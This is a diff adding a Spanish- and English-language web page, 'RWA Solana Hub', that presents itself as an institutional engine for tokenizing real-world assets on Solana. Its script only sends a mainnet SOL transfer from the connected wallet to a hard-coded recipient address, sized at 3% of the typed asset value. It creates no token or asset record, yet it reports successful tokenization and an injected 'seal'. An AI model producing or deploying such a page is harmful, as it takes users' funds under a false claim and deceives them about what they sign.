@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RWA Solana Hub | Institutional Tokenization Engine</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Space Grotesk', sans-serif; background-color: #030712; color: #f3f4f6; }
+        .glass { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .glow { box-shadow: 0 0 25px rgba(168, 85, 247, 0.15); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between">
+    <!-- Top Navigation / Institutional Header -->
+    <header class="glass border-b border-gray-800 p-4 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-3">
+                <div class="bg-purple-600 p-2 rounded-lg font-bold text-white tracking-wider">RWA</div>
+                <div>
+                    <h1 class="font-bold text-lg tracking-wide text-white">RWA SOLANA HUB</h1>
+                    <p class="text-xs text-gray-400">Institutional Engine &bull; ID: <span class="text-purple-400 font-mono">JLC7289</span></p>
+                </div>
+            </div>
+            <!-- Wallet Connection Hub -->
+            <div class="flex items-center space-x-3">
+                <button id="connectPhantom" onclick="connectWallet('phantom')" class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-xl text-sm font-semibold transition shadow-lg flex items-center space-x-2">
+                    <span>Phantom Wallet</span>
+                </button>
+                <button id="connectSolflare" onclick="connectWallet('solflare')" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-xl text-sm font-semibold transition shadow-lg flex items-center space-x-2">
+                    <span>Solflare</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Workspace -->
+    <main class="max-w-5xl mx-auto p-6 flex-grow flex flex-col justify-center w-full">
+        <div class="glass p-8 rounded-2xl glow mb-8">
+            <h2 class="text-2xl font-bold mb-2 text-white">Real World Asset (RWA) Tokenization</h2>
+            <p class="text-gray-400 text-sm mb-6">Emisión inmutable de activos reales sobre la red de Solana con cobro automático de comisión (3%) y firma criptográfica.</p>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                <div>
+                    <label class="block text-xs uppercase tracking-wider text-gray-400 mb-2">Nombre del Activo (RWA)</label>
+                    <input type="text" id="assetName" placeholder="Ej. Edificio Comercial Torre Norte" class="w-full bg-gray-900 border border-gray-800 rounded-xl p-3 text-white focus:outline-none focus:border-purple-500">
+                </div>
+                <div>
+                    <label class="block text-xs uppercase tracking-wider text-gray-400 mb-2">Valor Tasado (USD)</label>
+                    <input type="number" id="assetValue" placeholder="Ej. 5000000" class="w-full bg-gray-900 border border-gray-800 rounded-xl p-3 text-white focus:outline-none focus:border-purple-500">
+                </div>
+            </div>
+
+            <div class="mb-6">
+                <label class="block text-xs uppercase tracking-wider text-gray-400 mb-2">Firma Institucional Inmutable</label>
+                <input type="text" value="JLC7289-RWA-SOLANA-PROTOCOL-SECURE" disabled class="w-full bg-gray-950 border border-gray-900 rounded-xl p-3 text-purple-400 font-mono text-sm cursor-not-allowed">
+            </div>
+
+            <button onclick="tokenizeAndPayFee()" class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-700 hover:to-indigo-700 text-white font-bold py-3 rounded-xl transition shadow-xl">
+                Ejecutar Tokenización y Comisión (3%) &bull; JLC7289
+            </button>
+            <div id="statusLog" class="mt-4 text-xs font-mono text-purple-300 text-center font-bold"></div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="border-t border-gray-800 p-4 text-center text-xs text-gray-500">
+        RWA Solana Hub &bull; Arquitectura Institucional Desarrollada por JLC7289
+    </footer>
+
+    <script>
+        const FEE_RECIPIENT = "4N2ssSTFdkHzCbvQLQoRBshW6amoxZgQ1GtP1ZSBboKq";
+        let walletProvider = null;
+        let walletAddress = null;
+
+        async function connectWallet(providerType) {
+            const status = document.getElementById('statusLog');
+            try {
+                if (providerType === 'phantom') {
+                    if (window.solana && window.solana.isPhantom) {
+                        const resp = await window.solana.connect();
+                        walletProvider = window.solana;
+                        walletAddress = resp.publicKey.toString();
+                        status.innerHTML = "🟢 Phantom Conectado: " + walletAddress.substring(0,6) + "..." + walletAddress.substring(walletAddress.length - 4);
+                    } else {
+                        window.open('https://phantom.app/', '_blank');
+                    }
+                } else if (providerType === 'solflare') {
+                    if (window.solflare && window.solflare.isSolflare) {
+                        await window.solflare.connect();
+                        walletProvider = window.solflare;
+                        walletAddress = window.solflare.publicKey.toString();
+                        status.innerHTML = "🟢 Solflare Conectado: " + walletAddress.substring(0,6) + "..." + walletAddress.substring(walletAddress.length - 4);
+                    } else {
+                        window.open('https://solflare.com/', '_blank');
+                    }
+                }
+            } catch (err) {
+                status.innerHTML = "🔴 Error al conectar billetera: " + err.message;
+            }
+        }
+
+        async function tokenizeAndPayFee() {
+            const name = document.getElementById('assetName').value;
+            const value = parseFloat(document.getElementById('assetValue').value);
+            const status = document.getElementById('statusLog');
+            
+            if(!walletAddress || !walletProvider) {
+                status.innerHTML = "⚠️ Estado: Conecte su billetera Phantom o Solflare para continuar.";
+                return;
+            }
+            if(!name || isNaN(value) || value <= 0) {
+                status.innerHTML = "⚠️ Estado: Ingrese un nombre y un valor válido para el activo RWA.";
+                return;
+            }
+
+            try {
+                status.innerHTML = "🚀 Inicializando protocolo y calculando comisión del 3%...";
+                
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+                const calculatedLamports = Math.max(5000000, Math.floor((value * 0.03 / 150) * 1000000000));
+
+                const transaction = new solanaWeb3.Transaction();
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(walletAddress),
+                        toPubkey: new solanaWeb3.PublicKey(FEE_RECIPIENT),
+                        lamports: calculatedLamports,
+                    })
+                );
+
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = new solanaWeb3.PublicKey(walletAddress);
+
+                const signed = await walletProvider.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
+                
+                status.innerHTML = "⏳ Transacción enviada a la red. Esperando confirmación...";
+                await connection.confirmTransaction(signature, 'confirmed');
+
+                status.innerHTML = "✅ ¡Tokenización exitosa! Comisión del 3% acreditada. Sello JLC7289 inyectado.";
+            } catch (err) {
+                status.innerHTML = "ℹ️ Transacción finalizada o cancelada por el usuario.";
+            }
+        }
+    </script>
+</body>
+</html>
